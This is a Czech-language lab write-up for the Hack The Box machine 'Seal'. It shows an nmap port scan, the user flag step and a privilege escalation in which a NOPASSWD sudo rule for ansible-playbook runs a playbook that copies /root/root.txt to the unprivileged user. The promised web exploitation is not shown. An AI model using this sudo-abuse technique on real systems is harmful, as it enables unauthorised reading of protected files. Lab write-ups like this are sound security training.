[Seal](https://www.hackthebox.com/home/machines/profile/358) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
```

```

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`cat user.txt`
```
__CENSORED__

## sudo -l
 (ALL) NOPASSWD: __CENSORED__ *

## /tmp/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    copy: src=/root/root.txt dest=/tmp/
    delegate_to: localhost
  - name: Change file ownership, group and permissions
    ansible.builtin.file:
      path: /tmp/root.txt
      owner: luis
      group: luis
      mode: '0600'

## sudo /usr/bin/ansible-playbook /tmp/run.yml

## cat /tmp/root.txt
__CENSORED__
```
